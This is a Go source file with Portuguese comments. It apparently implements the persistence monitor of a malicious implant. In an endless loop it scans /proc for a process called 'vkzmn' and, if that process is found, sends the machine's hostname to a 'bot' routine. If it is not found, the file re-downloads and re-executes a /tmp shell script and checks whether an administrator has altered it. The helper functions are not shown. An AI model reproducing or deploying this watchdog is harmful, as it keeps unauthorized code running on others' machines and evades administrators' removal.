package main



import (
	"fmt"
	"io/ioutil"
	"os"
	"strings"
	"time"
        "os/exec"
       
)



//esse e o monitor ele ficara em um loop infinito  verificando se  o vkzmn esta em execucao




func  proc() {






for  { 


       

        
	time.Sleep(1  * time.Second)



	var vkzmn_ok int = 0

	dir, err := os.Open("/proc") //abre o diretorio /proc

	if err != nil {

		fmt.Println("error em open")

                 return 


	}




	file, err := dir.Readdir(0) //ler os arquivos e direorios dentro de /proc

	if err != nil {

		fmt.Println("erro em dir")

                 return 


	}

	for _, fi := range file { //intera sobre os diretorio


		procs_cmdline := fmt.Sprintf("/proc/%s/comm", fi.Name()) //constroi o caminho pra pega o cmdline dos processos em execucao


		read_procs, err := ioutil.ReadFile(procs_cmdline)


		if err != nil {

			fmt.Println("") //error em readall
                         

		}

		str_proc := string(read_procs)

		out := strings.Contains(str_proc, "vkzmn")

		if out == true {

			vkzmn_ok = 23
                        

		}

	}




	if vkzmn_ok == 23 {
                     
 
	
//vkzmn em execucao


                uname := exec.Command("uname" , "-n")

 
                o  , err_combined := uname.CombinedOutput() 


                         if  err_combined != nil { return }
                    
               msg :=    string(o)
  

                go    bot( msg   ) //notifique o bot 

 


	} else {






		fmt.Println("vkzmn nao ta em execucao")


                    _, err_open :=   os.Open("/tmp/down_vkzmn.sh")  

                        if  err_open != nil { 
                     
                            fmt.Println("down_vkzmn.sh nao foi abaixado")
              
                            ret_down := down_vkzmn()  


                              if   ret_down   !=  0 {  fmt.Println("chamando dow_raw" ) } // call  down_raw

       




                         } else {


                             fmt.Println("down_vkzmn.sh ja esta em //tmp" )
                                   
       
                             ret_magic :=  magic() //check script is valid  no curupted in download  or modifiqued by admin or  users  

                                fmt.Println(ret_magic)

                                     if ret_magic == 1  {   
      
                                       exec_vkzmn()   //scrip valid

                                      fmt.Println("script e valido chmando exec_vkzmn")

                                        }

                                     if ret_magic == 2  {  // script invalid

                                     
                                      fmt.Println("scripte e invalido chamando down_raw")
                                           


                            


                       }      
                                  




                       }








	}


    } //for


}
